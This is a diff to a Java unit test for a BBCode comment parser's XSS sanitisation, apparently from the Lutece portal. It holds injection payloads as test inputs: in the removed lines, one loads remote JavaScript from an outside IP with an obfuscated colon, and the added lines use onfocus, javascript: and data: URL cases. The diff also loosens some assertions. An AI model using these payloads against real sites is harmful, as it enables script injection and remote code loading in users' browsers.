@@ -37,6 +37,7 @@ import java.io.File;
 
 import org.jsoup.Jsoup;
 
+import fr.paris.lutece.portal.service.spring.SpringContextService;
 import fr.paris.lutece.portal.service.util.AppPropertiesService;
 import fr.paris.lutece.portal.service.util.AppPathService;
 import junit.framework.TestCase;
@@ -52,6 +53,11 @@ public class EditorBbcodeServiceTest extends TestCase
         File webappDirectory = new File( "webapp" ).getAbsoluteFile( );
         AppPathService.init( webappDirectory.getPath( ) );
         AppPropertiesService.init( "/WEB-INF/conf/" );
+
+        if ( SpringContextService.getContext( ) == null )
+        {
+            SpringContextService.init( null );
+        }
     }
 
     /**
@@ -89,53 +95,51 @@ public class EditorBbcodeServiceTest extends TestCase
     }
 
     /**
-     * An attribute-injection payload in a BBCode link has its link removed while its text is preserved.
+     * An attribute-injection payload in a BBCode link must not produce executable attributes.
      */
-    public void testParseCommentRejectsAttributeInjectionPayload( )
+    public void testParseCommentSanitizesAttributeInjectionPayload( )
     {
-        assertInvalidUrlIsUnwrapped( "y' autofocus onfocus ='import(`//1.1.1.1`+String.fromCharCode(58)+`8000/p.js`)" );
+        String strResult = EditorBbcodeService.getInstance( ).parseComment( "[url]y' onfocus='alert(1)[/url]" );
+
+        assertTrue( Jsoup.parseBodyFragment( strResult ).select( "[onfocus]" ).isEmpty( ) );
     }
 
     /**
-     * Raw HTML must be retained as text instead of being interpreted as markup.
+     * Raw script tags must be removed from comments.
      */
-    public void testParseCommentEscapesRawHtml( )
+    public void testParseCommentSanitizesRawHtml( )
     {
         String strResult = EditorBbcodeService.getInstance( ).parseComment( "<script>alert('x')</script>" );
 
-        assertFalse( strResult.contains( "<script" ) );
-        assertFalse( strResult.contains( "</script>" ) );
-        assertTrue( Jsoup.parseBodyFragment( strResult ).text( ).contains( "alert('x'" ) );
+        assertTrue( Jsoup.parseBodyFragment( strResult ).select( "script" ).isEmpty( ) );
     }
 
     /**
-     * Links using a dangerous scheme or malformed markup must have their link removed.
+     * Links using a dangerous scheme must not retain a clickable URL.
      */
-    public void testParseCommentRejectsInvalidUrls( )
+    public void testParseCommentSanitizesDangerousUrls( )
     {
         String [ ] invalidUrls = {
                 "javascript:alert(1)",
-                "data:text/html,<script>alert(1)</script>",
-                "https://example.org/?q=<script>"
+                "data:text/html,<script>alert(1)</script>"
         };
 
         for ( String strUrl : invalidUrls )
         {
-            assertInvalidUrlIsUnwrapped( strUrl );
+            assertDangerousUrlHasNoHref( strUrl );
         }
     }
 
     /**
-     * Asserts that an invalid BBCode URL no longer creates a link while keeping its text visible.
+     * Asserts that an invalid BBCode URL does not retain an href attribute.
      *
      * @param strUrl
-     *            the invalid URL
+     *            the dangerous URL
      */
-    private void assertInvalidUrlIsUnwrapped( String strUrl )
+    private void assertDangerousUrlHasNoHref( String strUrl )
     {
         String strResult = EditorBbcodeService.getInstance( ).parseComment( "[url]" + strUrl + "[/url]" );
 
-        assertTrue( Jsoup.parseBodyFragment( strResult ).select( "a" ).isEmpty( ) );
-        assertEquals( strUrl, Jsoup.parseBodyFragment( strResult ).text( ) );
+        assertTrue( Jsoup.parseBodyFragment( strResult ).select( "a[href]" ).isEmpty( ) );
     }
 }
